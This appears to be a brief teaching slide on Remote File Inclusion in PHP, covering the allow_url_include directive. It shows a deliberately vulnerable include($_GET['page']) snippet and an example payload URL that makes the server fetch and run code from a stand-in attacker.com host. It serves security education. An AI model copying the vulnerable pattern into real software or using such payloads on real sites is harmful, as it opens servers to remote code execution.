Remote Exploitation

Remote File Inclusion (RFI)

A vulnerability allowing an attacker to include and execute files from a remote server (controlled by the attacker) through user-supplied input.

Key PHP Directive

allow_url_include

When enabled in php.ini, this directive allows include() and require() functions to fetch files via URL, making RFI possible. It is typically disabled by default.

Key Takeaway

RFI provides a direct path to RCE by executing attacker-controlled remote scripts, especially when allow_url_include is enabled.

RFI Attack Scenario

Vulnerable PHP Code

<?php
// Vulnerable RFI example
$page = $_GET['page'];
include($page);
?>

Attacker's Payload

http://example.com/index.php?page=http://attacker.com/malicious.txt

malicious.txt on attacker's server contains PHP code to be executed.
